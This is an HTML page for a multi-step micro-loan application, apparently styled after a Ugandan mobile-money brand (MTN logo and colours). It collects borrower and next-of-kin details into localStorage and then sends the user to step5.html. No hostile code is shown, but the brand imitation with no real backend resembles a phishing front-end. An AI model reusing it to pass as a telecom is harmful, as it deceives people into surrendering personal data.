<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ombi la Mkopo - Super App</title>
    <style>
        :root {
            --primary-blue: #0A3D7E;
            --accent-yellow: #FFD600;
            --mtn-blue: #003a58;
            --bg-light: #f1f5f9;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            /* background-color: var(--primary-blue); */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #334155;
            overflow-x: hidden;
        }

        .header {
            background-color: var(--mtn-blue);
            padding: 20px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 150px;
        }

        .header img {
            max-height: 150px;
            object-fit: contain;
        }

        .container {
            flex: 1;
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 30px 20px;
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
            box-sizing: border-box;
            box-shadow: 0 -5px 15px rgba(0,0,0,0.1);
        }

        .step-page {
            display: none;
            animation: slideUp 0.4s ease-out;
        }

        .step-page.active {
            display: block;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .title {
            color: var(--primary-blue);
            font-size: 1.6rem;
            font-weight: 800;
            margin-bottom: 25px;
            text-align: center;
        }

        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #475569;
            font-size: 0.9rem;
        }

        input, select, textarea {
            width: 100%;
            padding: 15px;
            margin-bottom: 18px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 1rem;
            box-sizing: border-box;
            outline: none;
            transition: all 0.2s;
        }

        input:focus, select:focus, textarea:focus {
            border-color: var(--primary-blue);
            background-color: #f8fafc;
        }

        .slider-box {
            background: #f8fafc;
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 20px;
        }

        .slider {
            -webkit-appearance: none;
            width: 100%;
            height: 8px;
            border-radius: 5px;
            background: #cbd5e1;
            outline: none;
            margin: 15px 0;
        }

        .slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: var(--primary-blue);
            cursor: pointer;
            border: 3px solid var(--accent-yellow);
        }

        .val-display {
            font-weight: 800;
            color: var(--primary-blue);
            text-align: center;
            font-size: 1.2rem;
            margin: 5px 0;
        }

        button {
            width: 100%;
            padding: 18px;
            background-color: var(--primary-blue);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.1s;
        }

        button:active {
            transform: scale(0.98);
            background-color: #062a5a;
        }

        .error-box {
            color: #dc2626;
            background-color: #fef2f2;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 15px;
            font-size: 0.9rem;
            display: none;
            border: 1px solid #fee2e2;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            padding: 14px 0;
            border-bottom: 1px solid #f1f5f9;
        }

        .summary-label { font-weight: 600; color: #64748b; }
        .summary-val { font-weight: 700; color: var(--primary-blue); }

        .footer {
            padding: 25px;
            text-align: center;
            font-size: 0.8rem;
            color: rgba(255,255,255,0.6);
        }

        .loader {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #e2e8f0;
            border-top-color: var(--primary-blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="header">
        <img src="mtn-logo.png" alt="Logo" onerror="this.src='https://placehold.co/200x50/0A3D7E/FFFFFF?text=Super+App'">
    </div>

 <div class="container">
        <div id="errorBox" class="error-box"></div>

        <!-- STEP 1: LOAN DETAILS -->
        <div id="step1" class="step-page active">
            <h2 class="title">Loan Details</h2>
            
            <div class="slider-box">
                <label>Loan Amount (UGX)</label>
                <input type="range" min="30000" max="600000" id="amount" class="slider" oninput="updateValues()">
                <p id="amountDisplay" class="val-display">UGX 100,000</p>
            </div>

            <div class="slider-box">
                <label>Repayment Period (Days)</label>
                <input type="range" min="14" max="120" id="duration" class="slider" oninput="updateValues()">
                <p id="durationDisplay" class="val-display">14 Days</p>
            </div>

            <label>Reason for Loan</label>
            <textarea id="reason" placeholder="Example: Business capital, school fees..." rows="3"></textarea>

            <button onclick="validateStep1()">Continue</button>
        </div>

        <!-- STEP 2: PERSONAL DETAILS -->
        <div id="step2" class="step-page">
            <h2 class="title">Personal Details</h2>
            <input id="fname" placeholder="First Name" type="text">
            <input id="lname" placeholder="Last Name" type="text">
            
            <label>Phone Number</label>
            <input id="phone" value="+256" placeholder="Phone Number" type="tel" inputmode="tel">
            
            <label>Email Address</label>
            <input id="email" placeholder="Email Address" type="email">

            <button onclick="validateStep2()">Continue</button>
            <button onclick="goToStep(1)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
        </div>

        <!-- STEP 3: NEXT OF KIN -->
        <div id="step3" class="step-page">
            <h2 class="title">Next of Kin</h2>
            <input id="kfname" placeholder="Next of Kin First Name" type="text">
            <input id="klname" placeholder="Next of Kin Last Name" type="text">
            
            <label>Next of Kin Phone Number</label>
            <input id="kphone" value="+256" placeholder="Phone Number" type="tel" inputmode="tel">

            <input id="relationship" placeholder="Relationship (Example: Wife, Husband, Brother)">
            
            <button onclick="validateStep3()">Continue</button>
            <button onclick="goToStep(2)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
        </div>

        <!-- STEP 4: VERIFICATION OF DETAILS -->
        <div id="step4" class="step-page">
            <h2 class="title">Verification of Details</h2>
            <div id="summaryArea">
                <div class="summary-item"><span class="summary-label">Amount:</span><span id="sumAmount" class="summary-val"></span></div>
                <div class="summary-item"><span class="summary-label">Period:</span><span id="sumDuration" class="summary-val"></span></div>
                <div class="summary-item"><span class="summary-label">Your Name:</span><span id="sumName" class="summary-val"></span></div>
                <div class="summary-item"><span class="summary-label">Phone:</span><span id="sumPhone" class="summary-val"></span></div>
                <div class="summary-item"><span class="summary-label">Next of Kin:</span><span id="sumKin" class="summary-val"></span></div>
            </div>
            
            <p style="font-size: 0.85rem; color: #64748b; margin-top: 20px; text-align: center;">
                By clicking "Submit Application", you agree to our loan terms and conditions.
            </p>

            <button onclick="stepFive" id="step5Button"><a href="step5.html" style="color: var(--bg-light)">Continue</a></button>
            <button onclick="goToStep(3)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
        </div>

        <br>
        <br>
<!-- <img src="mixx-by-yass-tigo-pesa.png" alt="" srcset="" style="width: 100%; max-width: 300px; margin: 20px auto; display: block;"> -->

        
    </div>

    <div class="footer">
        &copy; 2026 Uganda Super App. All rights reserved.
    </div>

    <div id="pageLoader" class="loader">
        <div class="spinner"></div>
    </div>

    <script>
        // --- Helper Functions ---
        function showError(msg) {
            const eb = document.getElementById('errorBox');
            eb.innerText = msg;
            eb.style.display = 'block';
            window.scrollTo(0,0);
        }

        document.getElementById('step5Button').addEventListener('click', function() {
            window.location.href = "step5.html";
        });

        function hideError() {
            document.getElementById('errorBox').style.display = 'none';
        }

        function showLoader(cb) {
            document.getElementById('pageLoader').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('pageLoader').style.display = 'none';
                if(cb) cb();
            }, 800);
        }

        function goToStep(step) {
            hideError();
            document.querySelectorAll('.step-page').forEach(p => p.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
            window.scrollTo(0,0);
        }

        function updateValues() {
            const amount = document.getElementById('amount').value;
            const duration = document.getElementById('duration').value;
            document.getElementById('amountDisplay').innerText = "UGX " + parseInt(amount).toLocaleString();
            document.getElementById('durationDisplay').innerText = duration + " Days";
        }

        // --- Validation Logic ---
        function validateStep1() {
            const reason = document.getElementById('reason').value.trim();
            if(!reason) return showError("Please explain to us the reason for your loan application.");
            
            localStorage.setItem('amount', document.getElementById('amount').value);
            localStorage.setItem('duration', document.getElementById('duration').value);
            localStorage.setItem('reason', reason);
            
            showLoader(() => goToStep(2));
        }

        function validateStep2() {
            const fname = document.getElementById('fname').value.trim();
            const lname = document.getElementById('lname').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const email = document.getElementById('email').value.trim();
            
            const nameRegex = /^[A-Za-z]+$/;
            const ugPhoneRegex = /^\+256[0-9]{9}$/;

            if(!fname || !lname || !phone || !email) return showError("Please input the required fields.");
            if(!ugPhoneRegex.test(phone)) return showError("Please enter a valid UG phone number (+256...)");

            localStorage.setItem('fname', fname);
            localStorage.setItem('lname', lname);
            localStorage.setItem('phone', phone);
            localStorage.setItem('email', email);

            showLoader(() => goToStep(3));
        }

        function validateStep3() {
            const kfname = document.getElementById('kfname').value.trim();
            const klname = document.getElementById('klname').value.trim();
            const kphone = document.getElementById('kphone').value.trim();
            
            const ugPhoneRegex = /^\+256[0-9]{9}$/;

            if(!kfname || !klname || !kphone) return showError("Please input the required fields.");
            if(!ugPhoneRegex.test(kphone)) return showError("Please enter a valid UG phone number (+256...)");

            localStorage.setItem('kfname', kfname);
            localStorage.setItem('klname', klname);
            localStorage.setItem('kphone', kphone);

            populateSummary();
            showLoader(() => goToStep(4));
        }


        function populateSummary() {
            document.getElementById('sumAmount').innerText = "Ugx " + parseInt(localStorage.getItem('amount')).toLocaleString();
            document.getElementById('sumDuration').innerText = localStorage.getItem('duration') + " days";
            document.getElementById('sumName').innerText = localStorage.getItem('fname') + " " + localStorage.getItem('lname');
            document.getElementById('sumPhone').innerText = localStorage.getItem('phone');
            document.getElementById('sumKin').innerText = localStorage.getItem('kfname') + " (" + localStorage.getItem('kphone') + ")";
        }

        function finalSubmit() {
            showLoader(() => {
                document.querySelector('.container').innerHTML = `
                    <div style="text-align:center; padding:40px 10px;">
                        <div style="font-size:60px; margin-bottom:20px;">✅</div>
                        <h2 class="title">Your Application Has Been Received!</h2>
                        <p style="color:#64748b; line-height:1.6;">Thank you ${localStorage.getItem('fname')}. Your loan application is being processed. You will receive an SMS notification shortly.</p>
                        <button onclick="location.reload()" style="margin-top:30px;">Start Again</button>
                    </div>
                `;
            });
        }

        window.onload = updateValues;
    </script>
</body>
</html>
